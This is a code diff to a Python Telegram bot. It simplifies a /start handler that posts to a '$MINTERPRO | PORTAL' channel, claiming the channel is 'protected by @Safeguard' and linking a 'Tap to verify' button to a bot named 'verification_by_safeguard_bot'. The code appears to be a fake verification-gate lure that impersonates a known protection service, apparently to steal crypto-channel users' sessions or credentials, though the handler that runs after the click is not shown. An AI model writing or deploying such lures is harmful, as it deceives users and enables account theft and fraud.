@@ -94,35 +94,15 @@ async def on_verify_button_click(event):
 @portal_bot_client.on(events.NewMessage(pattern='/start'))
 async def on_portal_access(event):
     try:
-        # Define your channel ID
-        channel_id = '-1002486862799'  # Replace with your actual channel ID
-        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
-
-        # Download the image from the URL
-        async with aiohttp.ClientSession() as session:
-            async with session.get(image_url) as response:
-                if response.status == 200:
-                    print("Image fetched successfully.")
-                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
-
-                    # Upload the photo
-                    uploaded_photo = await portal_bot_client.upload_file(image_data)
-
-                    # Send the message to the channel
-                    await portal_bot_client.send_file(
-                        entity=channel_id,
-                        file=InputMediaUploadedPhoto(uploaded_photo),
-                        caption=(
-                            "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
-                            "Click below to verify you're human"
-                        ),
-                        buttons=[
-                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
-                        ]
-                    )
-                    print("Message sent successfully.")
-                else:
-                    print(f"Failed to fetch the image. HTTP Status: {response.status}")
+        print("Start command received.")
+        channel_id = '-1002486862799'  # Replace with actual channel ID
+        message = "$MINTERPRO | PORTAL is being protected by @Safeguard\n\nClick below to verify you're human"
+        await portal_bot_client.send_message(
+            entity=channel_id,
+            message=message,
+            buttons=[Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
+        )
+        print("Message sent successfully.")
     except Exception as e:
         print(f"Error: {e}")
 
